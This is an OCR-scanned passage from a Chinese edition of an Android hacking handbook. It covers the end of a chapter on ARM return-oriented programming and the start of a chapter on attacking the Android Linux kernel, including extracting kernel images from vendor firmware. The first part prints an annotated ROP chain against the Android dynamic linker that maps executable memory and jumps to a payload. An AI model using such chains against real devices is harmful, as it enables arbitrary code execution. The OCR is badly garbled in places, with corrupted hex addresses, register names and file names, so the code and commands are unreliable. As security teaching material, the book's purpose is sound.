链的偏移。结合两部分ROP链、memcpy调用和最终载荷跳转，最终的 ROP链如下：
0xb00038ca
0xb0018000
▪ r0: static allocation target address
• pop (r0-r4, pe)
0x00001000
 r1: size to allocate = one page
0x00000007
protection = read, vrite execute
0x00000032
+ r4: don't care
 r3:
flag8 = MAP_ANON I XAP_PRIVATE | MAP_PIXSD
0xdeadbeef
0xb0001678
fifth parameter on stack: td - -1
 pc: _d1_mmap, returning to 1r = 0xb006545
oxtttefttt
0x00000000
 sixth parameter on stack: offset - 0
0xb0005915
· pop over heap and string headers, pointer goes into r4
1第二个字符串从此处开始
0xb000131c
 pop (r0, 1r): bx 1r
0xb0018000
 1r: address of pop (pc)
 r0: copy destination = allocation address
0xb0002ab0
0xb0001918
pop (r2, r3, pc)
0x00001000
 r2: copy length = one page
0xb0018000
# r3: scratch memory = allocation address
T929000qX0
 r1 <- r4 ([x3] <- r4, pop (r4-z7))
Oxdeadbeef
0xdeadbeef
r5: don't care
 r4: don't care
Oxdeadbeef
r6: don't care
0xdeadbeef
 r7: don't care
0xb00001220
 __dl_nencpy, returns to and preserves 1r
tOT8tOOOqxO
 Thunb payload junp
9.4小结
通过阅读本章，可以了解到为何以及如何在ARM平台上使用ROP技术，来获得任意原生代
---
## Page 257
9.4小结
241
码的执行。在最近的Android系统版本中，使用ROP的主要原因是XN保护的开启，它让攻击者
无法直接执行普通内存中的数据。即使没有开启XN保护，ROP也可以用来解决ARM架构下指
令和数据缓存分离的问题。
基于1r的返回指令导致ROP难度加大；但是由于有pop（pc）这样的gadget，一般基于栈
的ROP依然可行。即使是以bx1r指令结尾的gadget也可以利用，只要聪明地将1r指向pop（pc）
指令即可。把ARM指令混淆解析成 Thumb的pop（-，pe）指令给我们带来了更多的gadget。
ARM的执行模式可以通过Interworking机制支持来实现，即设置gadget地址的最低位就可以切
换到Thumb模式。在ARM这样的RISC架构中，搜索gadget是非常容易的，它们都采用长度固
定的指令编码方式，用反汇编器生成的反汇编列表就能实现。
本章深人介绍了从Android动态链接器构建ROP链的案例。在Android4.0和更早的版本中
链接器基址是固定的，所以无需信息泄露就能够构造ROP链。动态链接器必须出现在所有动态
链接的二进制程序中（包括Android中默认编译产生的几乎所有二进制文件）.因此，它会成为
很多攻击者的目标。
下一章会介绍一些工具和技术，来教你如何开发、调试和利用Android操作系统内核。
---
## Page 258
第10章
攻击内核
Linux内核是Android操作系统的核心，是正常使用Android设备所不可或缺的。Linux内核
为应用层程序和物理硬件建立连接，对进程进行隔离，并管理各种权限。鉴于其作用和地位，攻
击Linux内核是获得Android设备完全控制权的最直接方式。
本章主要对攻击Android设备的Linux内核进行介绍，包括相关背景知识，如何配置、编译、
使用自定义的内核与内核模块，如何对内核进行post-mortem和实时调试，以及如何利用内核漏
洞来提升权限。最后，本章以几个案例来总结如何编写三个漏润的利用程序。
10.1Android的Linux内核
Android设备使用的Linux 内核最早源于RussellKing 在 1994年的项目将Linux 1.0移植
到Acom A5000芯片上。这个项目早于许多其他架构上的Linux内核移植，例如 SPARC、Alpha
和MIPS等。当时支持ARM的工具链非常乏，GNU编译器（GCC）等很多工具链中的工具都
不支持ARM。随着时间的推移，ARMLinux和相关工具链的移植工作陆续完成。然面，直到
Android的出现，ARMLinux内核才真正受到关注。
Android的Linux内核也并非在一夜之间出现，除了早期的移植工作外，Android开发者也作
了大量的修改，来支持这个新的操作系统。第2章中讨论到的很多改动，就是以自定义驱动的方
式在内核中出现的。需要特别注意的是Binder驱动，它是Android进程间通信（IPC）的核心。
Binder驱动为原生组件和 Dalvik组件之间的通信，以及应用组件（例如Intent）之间的通信提供
基础。另外，智能手机等敏感设备的安全性十分重要，这促生了许多增强安全性的方案。
很重要的一点是，Android的Linux 内核属于宏内核。在微内核架构中，许多驱动可以在相
对较小的权限下（虽然还是大于用户空间权限）运行，而对于Android的Limux内核，所有驱动
都是Linux内核的一部分，完全在 supervisor模式下运行。这一特点再加上广泛的攻击面，使得
内核成为最具吸引力的攻击对象。
10.2内核提取
Android的Linux内核不仅是单内核架构，而且本身就是单个二进制文件，通常命名为zlmage。
zlmage文件通常包含引导程序、解压程序，以及压缩后的内核代码和数据。当系统启动时，压缩
---
## Page 259
10.2内核提取243
的镜像会在解压后装入内存并执行，这个过程可能会在未来的Android版本中发生改变。
获得特定设备中的该二进制镜像文件有很多好处。第一，内核中存有编译时的各种配置信息。
特别需要提及的是全局函数和数据符号，本章“提取地址”部分会详细介绍。第二，有了镜像文
件，我们可以利用IDAPro这样的工具去分析代码并找到漏洞。第三，镜像文件可以用来验证已
知漏洞是否存在，或者移植一些漏洞利用程序。第四，从较高层面上说，内核镜像可以用来为新
的设备定制系统，或者为老的设备移植新版本的Android系统。提取内核镜像文件的原因可能有
许多，但是以上是最常见的儿个原因。
要得到二进制内核镜像，首先必须得到boot分区的镜像，方法有以下几种。第一种可能是
最简单的，就是从出厂固件镜像（有时候也叫ROM）中提取。对于不同的OEM，提取步骤也有
所差异，但是这些固件镜像中一定包含着二进制文件。如果你要尝试root某个设备，这种方法特
别适用。
第二种方法则需要一个已经成功root的设备，从目标设备中直接提取二进制镜像。这种方法
适用于移植或者缺乏完整ROM的情况。最后一种方法：许多Android开源项目（AOSP）支持设
备的内核二进制文件位于AOSP代码仓库的device目录中。经验表明，这种方法不太可靠，因为
这些二进制文件与真实设备中使用的内核镜像相比，版本过时或有差别。下一节中，我们会介绍
如何使用前两种方法来获取内核镜像
10.2.1从出厂固件中提取内核
要获得给定设备的出厂固件，有时很简单，有时则很困难。例如谷歌使用常见的TAR和ZIP
工具对镜像进行打包，并把Nexus设备的所有原厂镜像放在了，任何人都可以免费下载，无需认
证。有一些厂商使用了专有的文件格式来发布固件，在这种情况下，如果没有开源工具可用，要
访问里面的内容就需要厂商的专用工具，比较困难。本节介绍如何从各种原厂固件中提取
boot.img，以及如何从中解压出内核镜像。
1.Nexus出厂镜像
很多地方都能下载到Nexus设备的原厂镜像，因此它的内核二进制文件非常容易获得。例如
在本书撰写过程中发布的Android4.4，通过下载Nexus5的镜像，就可以抽取最新的内核来分析。
下载原厂镜像后，可以使用下列命令来解压缩：
10
dev:~/android/n5 $ tar zxf hammerhead-krt16m-factorybd9c39de.tgz
dev:~/android/n5 $ cd hammerhead-krt16m
boot1oader-hammerheadHHz11d. img
dev:~/andro1d/n5/hammezheadkrt16m $ 1s
flash-al1.bat
flasha1l,sh*
flash-base.sh*
Imagehammerheadkrt16m, z1p
radiohammerhead-M8974A-1.0.25.0.17.img
boot.img是最重要的文件，因为内核在引导过程中用到了它：
---
## Page 260
244第10章攻去内核
dev:~/android/n5/hamerheadkrt16m $ unzip -d ing \
imageharmerheadkrt16m.zip boot.img
Archive: imagehammerheadkrt16m.zip
inflating:ing/boot.ing
dev:~/android/n5/hammerheadkrt16m $ cd Ing
dev:~/android/n5/hammerheadkrt16m/ img $
到目前为止，你已经得到了boot.img，但是还需要从中提取内核，这个步骤将在10.2.3节
中介绍。
2.OEM原厂固件
寻找OEM提供的原厂固件并从中提取内核，要比Nexus设备麻烦很多。如前所述，每家OEM
都有自己的流程、工具和原厂固件的专有文件格式。有些厂商甚至不会发布他们的原厂固件，而
是强制你使用他们的工具来获得固件。即便是那些提供原厂固件镜像的厂商，也需要使用专用的
工具来提取或更新ROM。本节介绍从六大Android设备厂商的原厂固件中提取boot.img的步骤。
附录A列出了这些OEM更新和提取固件的工具。
·华硕
华硕的原厂固件镜像是zip压缩的blob文件，可以在官方支持网站下载。使用Github的
“BlobTools”项目，可以将boot.img等文件从blob中提取出来。
·HTC
HTC通常不会发布原厂固件，在其开发中心的网站上只能找到一小部分；但是，在第三方
网站上可以找到很多HTC的ROM，都是以ROM更新工具（RUU）的格式发布的。幸运的是，
有一些开源工具可以从RUU中提取出rom.zip.这样就无需使用Windows系统了。在rom.zip中，
boot_signed.img就是boot.img加上一个额外的头部，可以通过如下步骤来提取：
dev:~/android/htc-m7-ruu $ unzip rom.zip boot_unsigned.img
[-.. ]
dev:~/android/hte-m7-ruu $ dd if=boot_signed.img of=boot,ing be=256 skip=1
inflating: boot_signed.img
[-.·]
把256字节的头部删去，就可以得到boot.img。
·LG
LG的升级和还原工具非常复杂和特殊。LG手机支持工具甚至需要使用移动设备国际辨识码
（IMEI）来查询后端系统。幸运的是，通过搜索手机型号加上“stockROM”关键词，就能轻松
找到大多数设备的原厂ROM。槽糕的是，LG为ROM使用了很多专有的格式，包括BIN/TOT，
KDZ和CAB，使提取变得很困难。社区中有开发者开发了一些工具，简化了其内核提取。
我们从CAB文件说起，共分为三步。首先，用支持这种压缩格式的工具解压CAB文件。然
后，使用闭源的LGExtract工具（只支持Windows平台）从WDB文件中提取出一个BIN文件。
这个工具可以在XDA开发者论坛的http:/forum.xda-developers.com/showthread.php?t=1566532页
面找到。最后，使用https://github.com/Xonar/LGBinExtractor中的LGBinExtract 工具从BIN中提取
各个组件。在BIN目录中，会有一个8-BOOT.img文件。这就是你要找的文件，文件名前面的数
字可能会变化。在六大制造商中，LG的原厂固件是最复杂的。
---
## Page 261
10.2内核提取245
·摩托罗拉
正如大多数OEM一样，摩托罗拉也不提供原厂固件镜像的直接下载。由于大家对这些镜像
有需求，一些社区提供了下载。过去的摩托罗拉设备使用专有的SBF文件格式，可以使用
sbf_flash 的-x选项来提取文件。得到的 CG35.img文件就是要找的 bootimg。较新的设备使
用zip文件（.xml.zip）来包含各种分区镜像，包括bootimg。
·三星
三星使用专用工具Kies来分发原厂固件。除了这个工具以外，社区网站SamMobile也提供
了大量的三星原厂固件下载。三星使用tar.md5的文件扩展，表明这只是一个带上MD5的TAR
文件。它们通常也是使用zip进行压缩的。先进行zip解压，然后解压缩TAR就能得到 booLimg